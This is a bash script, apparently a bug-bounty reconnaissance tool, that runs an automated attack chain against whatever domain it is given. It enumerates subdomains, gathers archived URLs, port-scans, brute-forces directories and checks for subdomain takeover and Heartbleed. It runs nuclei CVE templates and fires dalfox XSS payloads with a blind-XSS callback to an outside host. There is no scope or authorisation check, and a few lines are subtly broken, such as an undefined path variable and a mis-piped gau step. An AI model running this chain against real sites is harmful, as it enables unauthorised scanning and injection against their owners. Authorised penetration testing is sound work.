#!/bin/bash

domain=$1
RED="\033[1;31m"
RESET="\033[0m"
subdomain_path=$domain/subdomains
waybackurl_path=$domain/waybackurl
nuclei_path=$domain/nuclei
dirsearch_path=$domain/dirsearch
parameter_path=$domain/parameter

if [ ! -d "$domain" ];then
	mkdir $domain

fi


if [ ! -d "$subdomain_path" ];then
	mkdir $subdomain_path

fi

if [ ! -d "$screenshot_path" ];then
	mkdir $waybackurl_path

fi

if [ ! -d "$nuclei_path" ];then
	mkdir $nuclei_path

fi

if [ ! -d "$dirsearch_path" ];then
	mkdir $dirsearch_path
fi

if [ ! -d "$parameter_path" ];then
        mkdir $parameter_path

fi

#subomain enumeration
echo -e "${RED}[+] Launching subfinder...${RESET}"
subfinder -silent -d $domain > $subdomain_path/found.txt

echo -e "${RED}[+] Launching Assetfinder...${RESET}"
assetfinder $domain |grep $domain >> $subdomain_path/found.txt

echo -e "${RED} [+] Running Amass. This could take a while...${RESET}"
amass enum -d $domain >> $subdomain_path/found.txt


#echo -e "${RED}[+] Launching Certspotter...${RESET}"
#curl -s https://certspotter.com/api/v0/certs\?domain\=$domain | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u >>  $subdomain_path/found.txt

# to find Alive domains
cat $subdomain_path/found.txt | sort -u | httprobe -prefer-https | grep https | sed 's/https\?:\/\///'| tee -a $subdomain_path/alive.txt


echo -e "${RED}[+] Checking waybackurls...${RESET}"
cat $subdomain_path/alive.txt | waybackurls > $waybackurl_path/waybackurls.txt


echo -e "${RED}[+] Checking gau...${RESET}"
cat $subdomain_path/alive.txt | gau | cat $waybackurl_path/waybackurls.txt | sort -u >> $waybackurl_path/waybackurls.txt

# seperate waybackurls
cat $waybackurl_path/waybackurls.txt | grep "\.js" | uniq | sort > $waybackurl_path/wayback_js.txt
cat $waybackurl_path/waybackurls.txt | grep "\.json" | uniq | sort > $waybackurl_path/wayback_json.txt
cat $waybackurl_path/waybackurls.txt | kxss | sed 's/^.*on //'| sed 's/=.*/=/' | dalfox pipe -b https://linux3rr0r.xss | sort > $waybackurl_path/xss_automation.txt

# finding ports of a subdomain
echo -e "${RED}[+] Launching Naabu${RESET}"
naabu -silent -iL $subdomain_path/found.txt -o $subdomain_path/ports.txt

# finding directories of a subdomain
echo -e "${RED}[+] Launching Dirsearch...${RESET}"
python3 /root/tools/dirsearch/dirsearch.py -q -x 404,403,500-599 -l $subdomain_path/found.txt -o $dirsearch_path/dirsearch.txt 




#Scanners

#finding Subdomain Takeovers
echo -e "${RED} [+] Running subzy....To Find Takeover bugs...${RESET}"
subzy -targets $subdomain_path/found.txt --hide_fails > $subdomain_path/subdomain_takeover.txt

#Heart Bleed Vuln
echo -e "${RED}[+] Checking For Heart Bleed Vulnerability...${RESET}"
cat $subdomain_path/found.txt | while read line ; do echo "QUIT"|openssl s_client -connect $line:443 2>&1|grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done

#finding nuclei cves
echo -e "${RED}[+] Launching Nuclei it takes sometime...${RESET}"
cat $subdomain_path/found.txt | httpx -silent | nuclei -silent -t /root/tools/nuclei-templates/ -o $nuclei_path/nuclei.txt




